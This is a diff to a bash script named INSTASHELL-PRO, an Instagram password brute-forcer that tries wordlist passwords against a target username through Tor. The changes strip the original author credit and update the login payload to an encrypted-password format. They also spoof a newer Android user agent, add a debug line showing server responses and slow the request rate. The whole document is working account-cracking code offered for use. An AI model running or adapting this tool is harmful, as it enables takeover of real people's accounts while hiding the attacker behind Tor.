@@ -1,16 +1,15 @@
 #!/bin/bash
-# INSTASHELL-PRO
-# GitHub: khalidhusin786
+# INSTASHELL-PRO UPDATED 2026
 
 trap 'exit 1' 2
 
 banner() {
     clear
     printf "\e[1;92m"
-    printf "  ░█─▄▀ █──█ █▀▀█ █── ─▀─ █▀▀▄ 　 ░█─░█ █──█ █▀▀ █▀▀█ ─▀─ █▀▀▄\n"
-    printf "  ░█▀▄─ █▀▀█ █▄▄█ █── ▀█▀ █──█ 　 ░█▀▀█ █──█ ▀▀█ █▄▄█ ▀█▀ █──█\n"
-    printf "  ░█─░█ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀─ 　 ░█─░█ ─▀▀▀ ▀▀▀ ▀──▀ ▀▀▀ ▀──▀\n"
-    printf "\e[1;77m\e[45m   FINAL STABLE VERSION {{Khalid Husain}}   \e[0m\n\n"
+    printf "  ░█─▄▀ █──█ █▀▀█ █── ─▀─ █▀▀▄ \n"
+    printf "  ░█▀▄─ █▀▀█ █▄▄█ █── ▀█▀ █──█ \n"
+    printf "  ░█─░█ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀─ \n"
+    printf "\e[1;77m\e[45m    FIXED VERSION - UPDATED SETTINGS    \e[0m\n\n"
 }
 
 get_token() {
@@ -55,17 +54,22 @@ bruteforcer() {
         guid=$(openssl rand -hex 16)
         device="android-$(openssl rand -hex 8)"
         
-        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"password\":\"$pass\", \"login_attempt_count\":\"0\"}"
+        # FIXED: Added modern enc_password format
+        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"enc_password\":\"#PWD_INSTAGRAM_BROWSER:0:$(date +%s):$pass\", \"login_attempt_count\":\"0\"}"
         sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
         hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)
 
         printf "\e[1;77mTesting: %-20s \e[0m" "$pass"
 
+        # FIXED: Updated User-Agent to 2026 version
         response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
-            -A "Instagram 155.0.0.37.107 Android (24/7.0; Xiaomi; Redmi Note 4)" \
+            -A "Instagram 320.0.0.41.108 Android (34/14; Google; Pixel 8 Pro)" \
             -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
             -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
             "https://i.instagram.com/api/v1/accounts/login/")
+
+        # DEBUG LINE: Shows you the real server response
+        echo -e "\e[1;30m [Response: $response]\e[0m"
 
         if [[ $response == *"logged_in_user"* ]]; then
             printf "\e[1;92m[FOUND!]\e[0m\n"
@@ -82,7 +86,7 @@ bruteforcer() {
         else
             printf "\e[1;90m[WRONG]\e[0m\n"
         fi
-        sleep 0.5
+        sleep 1
     done < "$wl_pass"
 }
 
